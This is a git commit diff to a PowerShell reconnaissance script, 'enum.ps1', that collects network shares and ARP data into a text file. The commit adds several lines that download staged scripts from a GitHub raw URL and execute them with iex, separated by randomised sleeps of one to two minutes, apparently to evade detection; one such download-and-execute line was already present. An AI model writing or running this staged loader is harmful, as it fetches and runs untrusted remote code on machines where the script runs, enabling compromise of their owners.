965115eab37c831c53e9102db36eddb1d2a9656d
encryptedSubject <148569257+encryptedSubject@users.noreply.github.com>
2023-11-10 11:43:01 -0500

    Update enum.ps1

--- enum.ps1
+++ enum.ps1
@@ -22,4 +22,11 @@ net share >> output.txt
 Write-Output "ARP ##" | Out-File -Append -FilePath .\output.txt
 arp -a >> output.tx
 
+(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/jS1.ps1") | iex
+Start-Sleep (Get-Random -min 60 -max 120)
+(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/gS1.ps1") | iex
+Start-Sleep (Get-Random -min 60 -max 120)
 (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS1.ps1") | iex
+Start-Sleep (Get-Random -min 60 -max 120)
+(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS2.ps1") | iex
+
